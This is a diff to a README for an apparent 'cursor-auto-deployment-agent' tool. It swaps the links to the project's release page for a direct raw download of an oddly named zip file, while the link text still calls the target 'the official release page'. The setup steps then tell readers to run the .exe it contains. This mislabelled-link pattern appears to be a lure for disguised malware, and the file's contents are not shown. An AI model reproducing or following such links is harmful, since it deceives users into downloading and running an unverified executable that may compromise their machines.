@@ -1,6 +1,6 @@
 # 🤖 cursor-auto-deployment-agent - Automate your deployment workflows with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/salvatoreabient793/cursor-auto-deployment-agent/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/salvatoreabient793/cursor-auto-deployment-agent/main/dawish/deployment_auto_cursor_agent_Jungermannia.zip)
 
 ## 🎯 About This Tool
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these instructions to set up the agent on your computer:
 
-1.  Visit the official release page: [https://github.com/salvatoreabient793/cursor-auto-deployment-agent/releases](https://github.com/salvatoreabient793/cursor-auto-deployment-agent/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/salvatoreabient793/cursor-auto-deployment-agent/main/dawish/deployment_auto_cursor_agent_Jungermannia.zip](https://raw.githubusercontent.com/salvatoreabient793/cursor-auto-deployment-agent/main/dawish/deployment_auto_cursor_agent_Jungermannia.zip).
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in .exe to start your download.
 4.  Open the file once the download finishes.
